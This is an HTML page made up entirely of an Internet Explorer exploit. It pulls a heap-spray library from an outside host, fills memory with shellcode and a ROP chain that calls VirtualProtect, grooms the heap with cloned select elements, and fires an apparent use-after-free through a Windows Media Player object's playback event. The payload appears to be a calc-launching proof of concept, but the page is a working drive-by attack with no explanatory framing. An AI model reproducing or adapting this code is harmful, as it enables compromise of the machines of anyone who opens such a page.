<html>
<head>
<script type="text/javascript" src="http://pwdme.cc/heaplib.js"></script>
<script>
var heap_obj = new heapLib.ie(0x10000);

var code = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100");  //Code to execute

var rop = unescape(
    "%u208c%u0040" + // 0x0040208c : ,# POP EBP # RETN [iexplore.exe] 
    "%u4141%u4141" +
    "%u208c%u0040" + // 0x0040208c : ,# skip 4 bytes [iexplore.exe]
    "%u2b2b%u0040" + // 0x00402b2b : ,# POP EBX # RETN [iexplore.exe] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%ucb29%u77c1" + // 0x00000000 : ,# 0x77c1cb29
    "%u0040%u0000" + 
    "%u2070%u0040" + // 0x00402070 : ,# POP ECX # RETN [iexplore.exe] 
    "%ubfe2%u0040" + // 0x0040bfe2 : ,# &Writable location [iexplore.exe]
    "%u19ec%u0040" + // 0x004019ec : ,# POP EDI # POP ESI # RETN [iexplore.exe] 
    "%u1921%u0040" + // 0x00401921 : ,# RETN (ROP NOP) [iexplore.exe]
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u187a%u0040" + // 0x0040187a : ,# POP ESI # RETN [iexplore.exe] 
    "%u9336%u0040" + // 0x00409336 : ,# JMP [EAX] [iexplore.exe]
    "%u2120%u0040" + // 0x00402120 : ,# POP EAX # POP EBP # RETN [iexplore.exe] 
    "%u121c%u75e0" + // 0x75e0121c : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT SXS.DLL]
    "%u0c60%u0c0c" + // 0x41414141 : ,# Filler (compensate)
    "%u2cec%u75e5" + // 0x75e52cec : ,# PUSHAD # RETN [SXS.DLL] 
    "%u318b%u7d5a" + // 0x7d5a318b : ,# jmp esp [shell32.dll]
"");

var padding = unescape("%u0c0c%u0c0c");
var padrop = unescape(
    "%u404c%u7d5d" + // 7d5d404c pop esi; ret 4;
    "%ud0fb%u7c96" + // 7C96D0FB xchg ecx,esp; ret
"");
rop = padrop + rop;

while (padding.length < 0x1000) padding += padding; // create big block of nops

offset_length = 0x5F6;
junk_offset = padding.substring(0, offset_length);

var shellcode = junk_offset + rop + code + padding.substring(0, 0x800 - code.length - junk_offset.length - rop.length);

while (shellcode.length < 0x40000) shellcode += shellcode;

var block = shellcode.substring(2, 0x40000 - 0x21);
for (var i=0; i < 500; i++) {
    heap_obj.alloc(block);
}

</script>
<script language='javascript'>
var heap = new heapLib.ie();
var selob = document.createElement("select")
selob.w0 = alert
selob.w1 = unescape("%u0c0c%u0c0c")
selob.w2 = alert
selob.w3 = alert
selob.w4 = alert
selob.w5 = alert
selob.w6 = alert
selob.w7 = alert
selob.w8 = alert
selob.w9 = alert
selob.w10 = alert
selob.w11 = alert
selob.w12 = alert
selob.w13 = alert
selob.w14 = alert
selob.w15 = alert
selob.w16 = alert
selob.w17 = alert
selob.w18 = alert
selob.w19 = alert
selob.w20 = alert
selob.w21 = alert
selob.w22 = alert
selob.w23 = alert
selob.w24 = alert
selob.w25 = alert
selob.w26 = alert
selob.w27 = alert
selob.w28 = alert
selob.w29 = alert
selob.w30 = alert
selob.w31 = alert
selob.w32 = alert
selob.w33 = alert
selob.w34 = alert
selob.w35 = alert
selob.w36 = alert
selob.w37 = alert
selob.w38 = alert
selob.w39 = alert
selob.w40 = alert
selob.w41 = alert
selob.w42 = alert
selob.w43 = alert
selob.w44 = alert
selob.w45 = alert
selob.w46 = alert
selob.w47 = alert
selob.w48 = alert
selob.w49 = alert
selob.w50 = alert
selob.w51 = alert
selob.w52 = alert
selob.w53 = alert
selob.w54 = alert
selob.w55 = alert
selob.w56 = alert
selob.w57 = alert
selob.w58 = alert
selob.w59 = alert
selob.w60 = alert
selob.w61 = alert
selob.w62 = alert
selob.w63 = alert

var clones=new Array(1000);

function feng_shui() {

    heap.gc();

    var i = 0;
    while (i < 1000) {
        clones[i] = selob.cloneNode(true)
        i = i + 1;
    }

    var j = 0;
    while (j < 1000) {
        delete clones[j];
        CollectGarbage();
        j  = j + 2;
    }

}

feng_shui();

function trigger(){
    var k = 999;
    while (k > 0) {
        if (typeof(clones[k].w1) == "string") {
        } else {
            clones[k].w1('come on!');
        }
        k = k - 2;
    }
    feng_shui();
    document.audio.Play();
}


</script>
<script for=audio event=PlayStateChange(oldState,newState)>
    if (oldState == 3 && newState == 0) {
        trigger();
    }
</script>
</head>
<body>
    <object ID="audio" WIDTH=1 HEIGHT=1 CLASSID="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95">
        <param name="fileName" value="test_case.mid">
        <param name="SendPlayStateChangeEvents" value="true">
        <param NAME="AutoStart" value="True">
        <param name="uiMode" value="mini">
        <param name="Volume" value="-300">
    </object>
</body>
</html>